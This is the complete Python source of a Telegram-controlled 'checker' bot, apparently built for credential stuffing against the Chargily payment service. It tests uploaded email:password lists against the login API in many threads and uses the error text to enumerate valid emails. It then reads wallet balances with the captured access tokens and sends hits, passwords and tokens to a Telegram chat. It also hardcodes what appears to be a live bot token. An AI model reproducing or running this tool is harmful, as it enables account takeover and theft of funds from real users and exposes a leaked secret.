#!/usr/bin/env python3
"""
Chargily Checker — Full Telegram Bot Control (guided flow)
Flow: /start → Send File button → upload → confirm → Start button → live results
"""
import os
import sys
import json
import time
import threading
import asyncio
import traceback
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup, BotCommand
)
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters
)
from telegram.constants import ParseMode

# ======================= CONFIG =======================
TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8745017792:AAGs4T5CBhi3Wfrre_XLbxjirsF4cGiEu_4").strip()
ADMIN_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "6207431030").strip()

LOGIN_URL = "https://app2.chargily.net/api/v1/auth/login"
WALLET_URL = "https://app2.chargily.net/api/v1/user/wallet"
REQUEST_TIMEOUT = 15

OUTPUT_DIR = os.getenv("OUTPUT_DIR", "./output")
os.makedirs(OUTPUT_DIR, exist_ok=True)

HEADERS = {
    "accept": "application/json",
    "content-type": "application/json",
    "origin": "https://app.chargily.com",
    "referer": "https://app.chargily.com/",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
}


def log(*a):
    print(f"[{datetime.now().strftime('%H:%M:%S')}]", *a, flush=True)


# ======================= STATE =======================
class CheckerState:
    def __init__(self):
        self.running = False
        self.stop_flag = False
        self.threads = 20
        self.delay = 0.3
        self.total = 0
        self.processed = 0
        self.good = 0
        self.valid = 0
        self.bad = 0
        self.blocked = 0
        self.total_dzd = 0.0
        self.total_cc = 0.0
        self.combos = []
        self.combo_filename = None
        self.start_time = None
        self.chat_id = None
        self.live_hits = []
        self.live_valids = []
        self.live_blocked = []
        self.lock = threading.Lock()
        self.awaiting_file = False   # state flag: waiting for user upload

STATE = CheckerState()


# ======================= CORE =======================
def check_login(email, password):
    payload = {"email": email, "password": password}
    try:
        resp = requests.post(LOGIN_URL, json=payload, headers=HEADERS, timeout=REQUEST_TIMEOUT)
        try:
            data = resp.json()
        except Exception:
            return "ERROR", {"message": f"Non-JSON: {resp.text[:100]}"}, None
        if resp.status_code in (200, 201):
            token = None
            if "data" in data and isinstance(data["data"], dict):
                token = data["data"].get("access_token") or data["data"].get("token")
            if not token:
                token = data.get("access_token") or data.get("token")
            if token:
                return "GOOD", data, token
            return "ERROR", data, None
        msg = data.get("message", "") or data.get("error", "") or str(data)
        ml = msg.lower()
        if "does not match" in ml or "wrong password" in ml:
            return "VALID_EMAIL", data, None
        if "user not found" in ml or "not registered" in ml:
            return "INVALID", data, None
        if "too many attempts" in ml or "blocked" in ml:
            return "BLOCKED", {"message": msg}, None
        return "ERROR", {"message": msg}, None
    except requests.exceptions.Timeout:
        return "ERROR", {"message": "Timeout"}, None
    except requests.exceptions.ConnectionError:
        return "ERROR", {"message": "Connection Error"}, None
    except Exception as e:
        return "ERROR", {"message": str(e)}, None


def fetch_wallet(token):
    h = HEADERS.copy()
    h["authorization"] = f"Bearer {token}"
    try:
        r = requests.get(WALLET_URL, headers=h, timeout=REQUEST_TIMEOUT)
        return r.json() if r.status_code == 200 else {"error": f"HTTP {r.status_code}"}
    except Exception as e:
        return {"error": str(e)}


def extract_balance(wallet):
    dzd, cc = 0, 0
    if isinstance(wallet, dict):
        for k in ("balance", "total_balance", "amount", "dzd"):
            if k in wallet:
                try: dzd = float(wallet[k]); break
                except Exception: pass
        for k in ("cc", "coins", "credit", "chargily_coins"):
            if k in wallet:
                try: cc = float(wallet[k]); break
                except Exception: pass
    return dzd, cc


def process_account(email, password, loop, bot):
    if STATE.stop_flag:
        return "STOPPED"

    status, data, token = check_login(email, password)
    with STATE.lock:
        STATE.processed += 1

    if status == "GOOD":
        wallet = fetch_wallet(token)
        dzd, cc = extract_balance(wallet)
        operator = wallet.get("operator") or wallet.get("operator_name") or "N/A"
        with STATE.lock:
            STATE.good += 1
            STATE.total_dzd += dzd
            STATE.total_cc += cc
            STATE.live_hits.append((email, password, dzd, cc, operator, token))
        msg = (
            f"<b>✅ HIT</b>\n"
            f"<code>{email}:{password}</code>\n"
            f"💰 DZD: <b>{dzd}</b> | CC: <b>{cc}</b>\n"
            f"🏦 Operator: <b>{operator}</b>\n"
            f"🔑 <code>{token[:60]}</code>"
        )
        asyncio.run_coroutine_threadsafe(_safe_send(bot, STATE.chat_id, msg), loop)

    elif status == "VALID_EMAIL":
        with STATE.lock:
            STATE.valid += 1
            STATE.live_valids.append((email, password))
        msg = f"<b>⚠️ VALID EMAIL</b>\n<code>{email}:{password}</code>"
        asyncio.run_coroutine_threadsafe(_safe_send(bot, STATE.chat_id, msg), loop)

    elif status == "BLOCKED":
        with STATE.lock:
            STATE.blocked += 1
            STATE.live_blocked.append((email, password))
        msg = f"<b>🚫 BLOCKED</b>\n<code>{email}:{password}</code>"
        asyncio.run_coroutine_threadsafe(_safe_send(bot, STATE.chat_id, msg), loop)

    else:
        with STATE.lock:
            STATE.bad += 1

    time.sleep(STATE.delay)
    return status


async def _safe_send(bot, chat_id, text):
    try:
        await bot.send_message(chat_id=chat_id, text=text,
                               parse_mode=ParseMode.HTML,
                               disable_web_page_preview=True)
    except Exception as e:
        log("[send error]", e)


# ======================= KEYBOARDS =======================
def kb_main():
    rows = []
    if STATE.combos:
        rows.append([InlineKeyboardButton(
            f"📄 File loaded: {STATE.total} accounts",
            callback_data="noop"
        )])
        rows.append([
            InlineKeyboardButton("▶️ Start Check", callback_data="menu_start"),
            InlineKeyboardButton("🔄 Replace File", callback_data="menu_send"),
        ])
    else:
        rows.append([InlineKeyboardButton("📤 Send Combo File", callback_data="menu_send")])
    rows.append([
        InlineKeyboardButton("📊 Stats", callback_data="menu_stats"),
        InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings"),
    ])
    rows.append([
        InlineKeyboardButton("📁 Results", callback_data="menu_results"),
        InlineKeyboardButton("🗑 Clear", callback_data="menu_clear"),
    ])
    if STATE.running:
        rows.append([InlineKeyboardButton("⏹ Stop", callback_data="menu_stop")])
    rows.append([InlineKeyboardButton("ℹ️ Help", callback_data="menu_help")])
    return InlineKeyboardMarkup(rows)


def kb_after_upload():
    """Shown after file is confirmed loaded."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"✅ Confirm & Start — {STATE.total} accounts",
                              callback_data="menu_start")],
        [InlineKeyboardButton("🔄 Upload Different File", callback_data="menu_send")],
        [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_back")],
    ])


def kb_waiting_file():
    """Shown while waiting for the user to upload."""
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("❌ Cancel", callback_data="menu_back")],
    ])


def kb_back():
    return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="menu_back")]])


def kb_settings():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("➖ Thr", callback_data="set_thr_minus"),
            InlineKeyboardButton(f"🧵 {STATE.threads}", callback_data="noop"),
            InlineKeyboardButton("➕ Thr", callback_data="set_thr_plus"),
        ],
        [
            InlineKeyboardButton("➖ Dly", callback_data="set_dly_minus"),
            InlineKeyboardButton(f"⏱ {STATE.delay:.1f}s", callback_data="noop"),
            InlineKeyboardButton("➕ Dly", callback_data="set_dly_plus"),
        ],
        [InlineKeyboardButton("⬅️ Back", callback_data="menu_back")],
    ])


def kb_results():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Good Hits", callback_data="res_good")],
        [InlineKeyboardButton("⚠️ Valid Emails", callback_data="res_valid")],
        [InlineKeyboardButton("🚫 Blocked", callback_data="res_blocked")],
        [InlineKeyboardButton("❌ Invalid/Errors", callback_data="res_bad")],
        [InlineKeyboardButton("📦 Send All Files", callback_data="res_all")],
        [InlineKeyboardButton("⬅️ Back", callback_data="menu_back")],
    ])


def stats_text():
    elapsed = int(time.time() - STATE.start_time) if STATE.start_time else 0
    return (
        f"<b>📊 Stats</b>\n"
        f"⚡ Running: <b>{STATE.running}</b> | 🧵 <b>{STATE.threads}</b> | ⏱ <b>{STATE.delay:.1f}s</b>\n"
        f"👥 Total: <b>{STATE.total}</b> | 🔁 Done: <b>{STATE.processed}</b>\n"
        f"✅ Hits: <b>{STATE.good}</b> | ⚠️ Valids: <b>{STATE.valid}</b>\n"
        f"🚫 Blocked: <b>{STATE.blocked}</b> | ❌ Bad: <b>{STATE.bad}</b>\n"
        f"💰 DZD: <b>{STATE.total_dzd:.2f}</b> | CC: <b>{STATE.total_cc:.2f}</b>\n"
        f"⏳ Elapsed: <b>{elapsed}s</b>"
    )


def file_summary_text():
    lines = [
        f"<b>📄 File Confirmed</b>",
        f"",
        f"📁 Name: <code>{STATE.combo_filename}</code>",
        f"👥 Accounts: <b>{STATE.total}</b>",
        f"🧵 Threads: <b>{STATE.threads}</b>",
        f"⏱ Delay: <b>{STATE.delay:.1f}s</b>",
        f"",
        f"<b>Preview (first 3):</b>",
    ]
    for i, (e, p) in enumerate(STATE.combos[:3]):
        lines.append(f"{i+1}. <code>{e}:{p[:3]}***</code>")
    if STATE.total > 3:
        lines.append(f"... and {STATE.total - 3} more")
    return "\n".join(lines)


def is_authorized(chat_id):
    if not ADMIN_CHAT_ID:
        return True
    return str(chat_id) == str(ADMIN_CHAT_ID)


# ======================= HANDLERS =======================
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    STATE.chat_id = chat_id
    if not is_authorized(chat_id):
        await update.message.reply_text("⛔ Unauthorized.")
        return

    await update.message.reply_text(
        "<b>🤖 Chargily Checker Bot</b>\n\n"
        "Welcome. Here's how it works:\n\n"
        "1️⃣ Press <b>📤 Send Combo File</b>\n"
        "2️⃣ Upload your <code>.txt</code> file\n"
        "3️⃣ Bot confirms the file\n"
        "4️⃣ Press <b>▶️ Start Check</b>\n"
        "5️⃣ Watch hits stream live\n\n"
        "Everything happens right here.",
        parse_mode=ParseMode.HTML,
        reply_markup=kb_main()
    )


async def cmd_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    STATE.chat_id = update.effective_chat.id
    await update.message.reply_text("🏠 <b>Main Menu</b>",
                                    parse_mode=ParseMode.HTML,
                                    reply_markup=kb_main())


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    STATE.chat_id = chat_id
    if not is_authorized(chat_id):
        return

    doc = update.message.document
    if not doc:
        return
    if not doc.file_name.lower().endswith((".txt", ".csv")):
        await update.message.reply_text(
            "❌ Only <code>.txt</code> or <code>.csv</code> accepted.",
            parse_mode=ParseMode.HTML,
            reply_markup=kb_waiting_file()
        )
        return

    status_msg = await update.message.reply_text("📥 <b>Downloading file...</b>",
                                                 parse_mode=ParseMode.HTML)
    try:
        tg_file = await doc.get_file()
        path = os.path.join(OUTPUT_DIR, f"combos_{int(time.time())}.txt")
        await tg_file.download_to_drive(path)

        combos = []
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                if ":" in line:
                    e, p = line.split(":", 1)
                    combos.append((e.strip(), p.strip()))
                else:
                    combos.append((line, "dummy_pass"))

        if not combos:
            await status_msg.edit_text("❌ File empty or unreadable.",
                                       reply_markup=kb_waiting_file())
            return

        STATE.combos = combos
        STATE.total = len(combos)
        STATE.combo_filename = doc.file_name
        STATE.awaiting_file = False

        await status_msg.edit_text(
            file_summary_text(),
            parse_mode=ParseMode.HTML,
            reply_markup=kb_after_upload()
        )
    except Exception as e:
        log("doc error:", traceback.format_exc())
        await status_msg.edit_text(f"❌ <code>{e}</code>",
                                   parse_mode=ParseMode.HTML,
                                   reply_markup=kb_waiting_file())


async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try:
        await q.answer()
    except Exception:
        pass

    data = q.data or ""
    chat_id = update.effective_chat.id
    STATE.chat_id = chat_id

    if not is_authorized(chat_id):
        return
    if data == "noop":
        return

    try:
        if data == "menu_back":
            await q.edit_message_text(
                "🏠 <b>Main Menu</b>",
                parse_mode=ParseMode.HTML,
                reply_markup=kb_main()
            )
            return

        if data == "menu_send":
            STATE.awaiting_file = True
            await q.edit_message_text(
                "📤 <b>Send Combo File</b>\n\n"
                "Now send me a <code>.txt</code> file.\n"
                "Each line: <code>email:password</code>\n\n"
                "<i>Waiting for your file...</i>",
                parse_mode=ParseMode.HTML,
                reply_markup=kb_waiting_file()
            )
            return

        if data == "menu_start":
            if STATE.running:
                await q.edit_message_text("⚠️ Already running.",
                                          reply_markup=kb_main())
                return
            if not STATE.combos:
                await q.edit_message_text(
                    "❌ No combo file loaded.\n\nPress 📤 Send Combo File first.",
                    parse_mode=ParseMode.HTML,
                    reply_markup=kb_main()
                )
                return
            asyncio.create_task(run_check(context.application))
            await q.edit_message_text(
                f"🚀 <b>Check Started</b>\n\n"
                f"📄 {STATE.total} accounts\n"
                f"🧵 {STATE.threads} threads\n"
                f"⏱ {STATE.delay:.1f}s delay\n\n"
                f"Live results will stream below. Use 📊 Stats to check progress.",
                parse_mode=ParseMode.HTML,
                reply_markup=kb_main()
            )
            return

        if data == "menu_stop":
            if not STATE.running:
                await q.edit_message_text("Nothing running.", reply_markup=kb_main())
                return
            STATE.stop_flag = True
            await q.edit_message_text("⏹ <b>Stopping after current batch...</b>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_main())
            return

        if data == "menu_stats":
            await q.edit_message_text(stats_text(), parse_mode=ParseMode.HTML,
                                      reply_markup=kb_main())
            return

        if data == "menu_settings":
            await q.edit_message_text("⚙️ <b>Settings</b>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_settings())
            return

        if data == "menu_results":
            await q.edit_message_text("📁 <b>Results</b>\n\nPick a category:",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_results())
            return

        if data == "menu_clear":
            with STATE.lock:
                STATE.live_hits.clear()
                STATE.live_valids.clear()
                STATE.live_blocked.clear()
                STATE.good = STATE.valid = STATE.bad = STATE.blocked = 0
                STATE.total_dzd = STATE.total_cc = 0.0
                STATE.processed = 0
            for f in ("good.txt", "valid.txt", "blocked.txt", "bad.txt"):
                try: os.remove(os.path.join(OUTPUT_DIR, f))
                except Exception: pass
            await q.edit_message_text("🗑 <b>Results cleared.</b>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_main())
            return

        if data == "menu_help":
            await q.edit_message_text(
                "<b>ℹ️ Help</b>\n\n"
                "<b>Upload:</b> Send <code>.txt</code> with <code>email:password</code> lines\n"
                "<b>Start:</b> ▶️ begins the check\n"
                "<b>Live:</b> Hits, valids, blocks stream as messages\n"
                "<b>Results:</b> 📁 to download categorized files\n"
                "<b>Settings:</b> ⚙️ threads and delay on the fly\n"
                "<b>Stop:</b> ⏹ halts gracefully\n\n"
                "<i>Only the bot admin chat can use this bot.</i>",
                parse_mode=ParseMode.HTML,
                reply_markup=kb_main()
            )
            return

        if data == "set_thr_plus":
            STATE.threads = min(STATE.threads + 5, 100)
            await q.edit_message_text("⚙️ <b>Settings</b>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_settings()); return
        if data == "set_thr_minus":
            STATE.threads = max(STATE.threads - 5, 5)
            await q.edit_message_text("⚙️ <b>Settings</b>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_settings()); return
        if data == "set_dly_plus":
            STATE.delay = round(STATE.delay + 0.1, 1)
            await q.edit_message_text("⚙️ <b>Settings</b>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_settings()); return
        if data == "set_dly_minus":
            STATE.delay = max(round(STATE.delay - 0.1, 1), 0.0)
            await q.edit_message_text("⚙️ <b>Settings</b>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=kb_settings()); return

        if data.startswith("res_"):
            kind = data[4:]
            if kind == "all":
                sent = 0
                for name, cap in [("good.txt", "Good Hits"), ("valid.txt", "Valid"),
                                  ("blocked.txt", "Blocked"), ("bad.txt", "Bad")]:
                    p = os.path.join(OUTPUT_DIR, name)
                    if os.path.exists(p) and os.path.getsize(p) > 0:
                        with open(p, "rb") as f:
                            await context.bot.send_document(chat_id, f, caption=cap)
                        sent += 1
                if sent == 0:
                    await context.bot.send_message(chat_id, "📭 No files yet.")
                return
            p = os.path.join(OUTPUT_DIR, f"{kind}.txt")
            if not os.path.exists(p) or os.path.getsize(p) == 0:
                await context.bot.send_message(chat_id, f"📭 No {kind} results.")
                return
            with open(p, "rb") as f:
                await context.bot.send_document(chat_id, f, caption=kind.title())
            return

    except Exception as e:
        log("callback error:", traceback.format_exc())
        try:
            await context.bot.send_message(chat_id, f"⚠️ Error: <code>{e}</code>",
                                           parse_mode=ParseMode.HTML)
        except Exception:
            pass


# ======================= RUN CHECK =======================
async def run_check(app: Application):
    if STATE.running:
        return
    STATE.running = True
    STATE.stop_flag = False
    STATE.start_time = time.time()

    chat_id = STATE.chat_id
    bot = app.bot
    loop = asyncio.get_running_loop()

    await bot.send_message(chat_id,
                           f"<b>🚀 Started</b>\n"
                           f"Accounts: {STATE.total}\n"
                           f"Threads: {STATE.threads}",
                           parse_mode=ParseMode.HTML)

    async def progress_loop():
        try:
            msg = await bot.send_message(chat_id, "⏳ Starting...", parse_mode=ParseMode.HTML)
            while STATE.running:
                await asyncio.sleep(4)
                try:
                    await msg.edit_text(stats_text(), parse_mode=ParseMode.HTML)
                except Exception:
                    pass
        except asyncio.CancelledError:
            pass

    progress_task = asyncio.create_task(progress_loop())

    def run_pool():
        with ThreadPoolExecutor(max_workers=STATE.threads) as ex:
            futures = [ex.submit(process_account, e, p, loop, bot) for e, p in STATE.combos]
            for _ in as_completed(futures):
                if STATE.stop_flag:
                    break

    await loop.run_in_executor(None, run_pool)

    STATE.running = False
    progress_task.cancel()

    # write output files
    with open(os.path.join(OUTPUT_DIR, "good.txt"), "w", encoding="utf-8") as f:
        for e, p, dzd, cc, op, t in STATE.live_hits:
            f.write(f"{e}:{p} | DZD:{dzd} CC:{cc} | {op} | {t}\n")
    with open(os.path.join(OUTPUT_DIR, "valid.txt"), "w", encoding="utf-8") as f:
        for e, p in STATE.live_valids:
            f.write(f"{e}:{p}\n")
    with open(os.path.join(OUTPUT_DIR, "blocked.txt"), "w", encoding="utf-8") as f:
        for e, p in STATE.live_blocked:
            f.write(f"{e}:{p}\n")
    with open(os.path.join(OUTPUT_DIR, "bad.txt"), "w", encoding="utf-8") as f:
        f.write(f"Bad count: {STATE.bad}\n")

    await bot.send_message(
        chat_id,
        f"<b>🏁 Finished</b>\n\n{stats_text()}",
        parse_mode=ParseMode.HTML,
        reply_markup=kb_main()
    )


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    log("EXCEPTION:", traceback.format_exc())


async def post_init(app: Application):
    await app.bot.set_my_commands([
        BotCommand("start", "Open menu"),
        BotCommand("menu", "Show menu"),
    ])
    log("Bot online.")


def main():
    if not TELEGRAM_BOT_TOKEN:
        log("FATAL: TELEGRAM_BOT_TOKEN not set")
        sys.exit(1)

    app = (
        Application.builder()
        .token(TELEGRAM_BOT_TOKEN)
        .post_init(post_init)
        .build()
    )

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("menu", cmd_menu))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_error_handler(error_handler)

    log("Polling...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
